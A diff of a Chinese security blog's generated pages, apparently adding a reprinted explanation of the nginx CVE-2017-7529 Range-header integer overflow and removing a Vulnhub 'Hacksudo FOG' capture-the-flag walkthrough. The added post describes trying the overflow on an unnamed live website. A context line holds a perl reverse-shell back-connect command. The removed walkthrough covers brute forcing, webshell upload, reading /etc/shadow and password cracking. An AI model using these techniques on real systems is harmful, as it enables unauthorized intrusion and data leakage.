@@ -86,6 +86,71 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/08/CVE-2017-7529-Nginx/">
+                CVE-2017-7529-Nginx
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="nginx-整数溢出小结-cve-2017-7529">nginx 整数溢出小结 cve-2017-7529</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/gaogaogaopipi/article/details/90301358">gaogaogaopipi</a></p>
+</blockquote>
+<h2><span id="起因">起因</span></h2><blockquote>
+<p>这两天在做nginx整数溢出时出了点小岔子，经过学习对这个问题有了深入的了解，特此记录。</p>
+<p>漏洞补丁以及平安银河实验室已经把这事说的很清楚了，在此记录<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/140402.html">原文地址</a></p>
+<p>简单的说就是这么一回事：<br>HTTP的Range允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range来并发下载；<br>正常情况下组件代码中计算了Range的长度，防止溢出，可以构造恶意长度来绕过，从而读取缓存的头部数据，造成泄露。</p>
+<p>细节要留意的就是range的相关定义，示例如下<br>Range:bytes&#x3D;0-1024 表示访问第0到第1024字节；<br>Range:bytes&#x3D;500-600,601-999，-300 表示分三块访问，分别是500到600字节，601到600字节，最后的300字节；</p>
+<p>在Response头中设置:<br>Accept-Ranges:bytes 表示接受部分资源的请求；<br>Content-Range: bytes START-END&#x2F;SIZE 表示返回的资源位置；其中SIZE等于Content-Length;如：Content-Range: bytes 500-600&#x2F;1000</p>
+</blockquote>
+<h2><span id="经过">经过</span></h2><blockquote>
+<p>测试站点：www.（我肯定是不能明说）.com.cn</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/1.png" alt="image"></p>
+<p>以站点的一张图片为例子，路径：&#x2F;images&#x2F;sq.jpg</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/2.png" alt="image"></p>
+<p>上图可以看到正常情况下content-length的大小是8935bytes，也就是size的大小。<br>size大小就是我一开始搞混了的地方，清楚了size的大小那么根据平安银河实验室的文章就有如下过程：</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/3.png" alt="image"></p>
+<p>上图可以看到正常的返回数据以及完整的ranges长度返回。</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/4.png" alt="image"></p>
+<p>上图可以看到，选择返回后十个bytes得到的结果（8935-10&#x3D;8925，所以是从8925开始返回。因为写定的end是总长减一，所以结尾的值是8934，所以此处statr&#x3D;8925,end&#x3D;8934），以及返回的range的位置。</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/5.png" alt="image"></p>
+<p>上图是对上面的补充，可以看到在读取部分bytes时，完整的参数是从“多少”到“多少”，上面是从1到10</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/6.png" alt="image"></p>
+<p>上图可以看到，在使用完整的输入模式，对-1开始读取的时候，触发了<code>ngx_http_range_parse()</code><br>对statr的负值检查，所以报错，无法读取。<br>那么此时就如原文所说<br>因此，如果需要将start解析为负数，只能通过-end这类后缀型range参数实现</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/7.png" alt="image"></p>
+<p>如上图，使用 -end 只设置一个大于8935的值，此时statr &#x3D; 8935-9000 &#x3D; -65，满足了负值。但按上文所说，statr是负值则会报错。<br>注意到此时并未报错，而是正常返回，原因是此处设置的range不是完整模式，虽然是负值，但是因为end的默认值是总长-1（8935-1&#x3D;8934），那么此时这段要读取的range的范围是从 -65到 8934 其实际总长超过了 8935 所以nginx丢弃了range，所以正常返回。</p>
+</blockquote>
+<h2><span id="重点">重点</span></h2><blockquote>
+<p>上面满足了传值为负值的条件，但是因为总长度检测的原因，导致丢弃range，那么如果绕过总长度检测？为什么这个漏洞要叫 整数溢出 漏洞呢？<br>这里注意到 ***start, end, size均为64位有符号整形，值的范围是-9223372036854775808 … 9223372036854775807 ，那么根据补丁中的代码 size +&#x3D; end - start</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/8.png" alt="image"></p>
+<p>只要最终size的值是负值，即可溢出，从而绕过检测，所以叫 整数溢出<br>0x8000 0000 0000 0000既是64位有符号型的最小负值，所以只需要最终相加得到的size为0×8000000000000000即可。</p>
+<p>注意 size +&#x3D; end -start;这等于如果存在多个range，那么就会有 size &#x3D; size + (end - start)<br>也就是说在有多个range时，最终的size &#x3D; size1 + size2 + … +sizeN<br>如上所说，只要size是负值即可溢出，那么就能得到第二个range的值，若第一个range是9500<br>那么0x8000000000000000-9500 既是第二个值</p>
+<p>那么如下图：</p>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/9.png" alt="image"></p>
+<p>成功！</p>
+</blockquote>
+<h2><span id="结果">结果</span></h2><blockquote>
+<p><img src="/2022/08/08/CVE-2017-7529-Nginx/10.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
                 Shiro RememberMe 1.2.4
             </a>
@@ -427,7 +492,7 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](25.png)</span><br></pre></td></tr></table></figure>
 <p>cd &#x2F;home&#x2F;hermoine&#x2F;bin<br>.&#x2F;su_cp -p &#x2F;home&#x2F;snape&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh&#x2F;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](26.png)</span><br></pre></td></tr></table></figure>
-<p>Kali:<br>ssh <a href="mailto:&#104;&#101;&#114;&#109;&#x6f;&#105;&#x6e;&#x65;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x35;&#x36;&#46;&#49;&#48;&#53;">&#104;&#101;&#114;&#109;&#x6f;&#105;&#x6e;&#x65;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x35;&#x36;&#46;&#49;&#48;&#53;</a> -i .ssh&#x2F;id_rsa</p>
+<p>Kali:<br>ssh <a href="mailto:&#x68;&#101;&#x72;&#x6d;&#111;&#105;&#110;&#x65;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x35;&#x36;&#46;&#49;&#48;&#x35;">&#x68;&#101;&#x72;&#x6d;&#111;&#105;&#110;&#x65;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x35;&#x36;&#46;&#49;&#48;&#x35;</a> -i .ssh&#x2F;id_rsa</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5.这个时候我们就可以去/root目录下查看horcrux2.txt这个文件，同样是用base64解密： </span><br><span class="line">![image-](27.png)</span><br><span class="line"></span><br><span class="line">### root提权</span><br><span class="line">1.我们可以在.mozilla/firefox/g2mhbq0o.default/目录下发现浏览器的登录信息，则考虑使用读取浏览器用户名和密码的工具firepwd，在hermoine开启一个http服务，传输要解密的文件给kali，可以爆出root的密码：</span><br></pre></td></tr></table></figure>
 <p>hermoine:<br>cd .mozilla&#x2F;firefox&#x2F;g2mhbq0o.default&#x2F;<br>ls -al</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-](28.png)</span><br></pre></td></tr></table></figure>
@@ -980,124 +1045,6 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <p><img src="/2022/08/03/Hacksudo-Search/18.png" alt="image-"></p>
 <p>4.在&#x2F;root目录下，可以找到flag，即root.txt:</p>
 <p><img src="/2022/08/03/Hacksudo-Search/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/Hacksudo-FOG/">
-                Hacksudo FOG
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hacksudofog">Hacksudo:FOG</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hacksudofog">名称：hacksudo:FOG</span></h4><h4><span id="发布日期2021514">发布日期：2021.5.14</span></h4><h4><span id="作者vishal-waghmare">作者：Vishal Waghmare</span></h4><h4><span id="系列hacksudo">系列：hacksudo</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>hacksudo:&#x2F;flag1.txt<br>www-data:&#x2F;var&#x2F;www&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hacksudo-fogzip">文件名：hacksudo-FOG.zip</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehacksudohacksudo-fogzip">下载地址：</span></h4><h4><span id="md5-fe8360e56637fe0d278ef2c38f15b969">MD5: FE8360E56637FE0D278EF2C38F15B969</span></h4><h4><span id="sha1-31b1210f45c74d3062a0edd5677c6bb770eb26af">SHA1: 31B1210F45C74D3062A0EDD5677C6BB770EB26AF</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机FOG和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，访问主页源码中隐藏了一个index1.html：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.112 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/4.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，index1.html提示我们一个音频文件提取工具：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.112/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/6.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/7.png" alt="image-"></p>
-</blockquote>
-<h3><span id="cms漏洞利用">CMS漏洞利用</span></h3><blockquote>
-<p>1.我们将提示的解析工具下载下来，尝试用工具解析index.html页的smoke.mp4，但不是wav格式没有信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hacksudo/SoundStegno.git，获取工具</span><br><span class="line">cd SoundStegno</span><br><span class="line">wget http://192.168.56.112/smoke.mp4</span><br><span class="line">python3 ExWave.py -f smoke.mp4</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/8.png" alt="image-"></p>
-<p>2.通过之前的目录扫描，我们发现有cms页面和一个dict.txt文件：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/9.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/10.png" alt="image-"></p>
-<p>3.将dict.txt文件下载，很可能是密码字典，再去查询cms的漏洞，发现是2.2.5版本，有未经身份验证的SQL注入漏洞可以使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.112/dict.txt</span><br><span class="line">whatweb http://192.168.56.112/cms，查看框架版本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmadesimple-exploit.py -u http://192.168.56.112/cms，漏洞利用程序获取见：https://gist.github.com/kriss-u/321f0418778697e2ec919f04664ceb4b</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/12.png" alt="image-"></p>
-<p>4.知晓了用户名，写入user，可以尝试使用hydra爆破密码，登录FTP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P dict.txt 192.168.56.112 ftp</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/13.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ftp登录提取音频隐藏信息">FTP登录，提取音频隐藏信息</span></h3><blockquote>
-<p>1.可以使用hacksudo用户FTP登录，获取到第一个flag，即flag1.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/14.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/15.png" alt="image-"></p>
-<p>2.进入hacksudo_ISRO_bak目录，发现secr3tSteg.zip文件，需要密码，我们用zip2john配合john获得密码：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john secr3tSteg.zip &gt;&gt; hash.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/17.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/18.png" alt="image-"></p>
-<p>3.解压得到的hacksudoSTEGNO.wav可以使用SoundStegno进行解密：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ExWave.py -f hacksudoSTEGNO.wav</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/19.png" alt="image-"></p>
-<p>4.根据之前index1.html页源码的提示，需要用到caesar-cipher解密，我们解密这个数据可以得到一个用户名密码，这个用户与密码可用于登录cms后台：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/20.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/21.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件上传漏洞getshell">文件上传漏洞GETSHELL</span></h3><blockquote>
-<p>1.进入cms后台的content页，可以上传phtml文件后缀的webshell，这里我们使用kali自带的webshell进行修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/22.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/23.png" alt="image-"></p>
-<p>2.kali开启对应端口监听，触发webshell，利用python生成交互式shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/24.png" alt="image-"></p>
-<p>3.在&#x2F;var&#x2F;www目录下能发现第二个flag，即flag2.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/25.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权ssh登录">初步提权，SSH登录</span></h3><blockquote>
-<p>1.查看具有root权限的suid文件，尝试提权，发现&#x2F;usr&#x2F;bin&#x2F;look：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/26.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/27.png" alt="image-"></p>
-<p>2.通过在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E4%B8%8A%E6%9F%A5%E6%89%BE%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8look%E6%9F%A5%E7%9C%8B%E5%85%B7%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%99%E7%94%A8look%E6%9F%A5%E7%9C%8B/etc/shadow%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0root%E5%8F%8Aisro%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81hash%EF%BC%8C%E4%BD%BF%E7%94%A8john%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9A">https://gtfobins.github.io/上查找发现可以使用look查看具有root权限的文件，则用look查看/etc/shadow可以发现root及isro用户的密码hash，使用john解一下：</a></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/28.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/29.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/30.png" alt="image-"></p>
-<p>3.爆出isro用户密码为qwerty，可以进行ssh登录，然后在目录下查看到user.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/31.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.我们进入&#x2F;fog目录下，发现有一个fog文件属主为root，查看不出来，但是执行后与python2.7相关联，则可以通过python进行root提权：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/32.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/33.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下的root.txt即是我们需要的最后一个flag：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/34.png" alt="image-"></p>
 </blockquote>
 
 
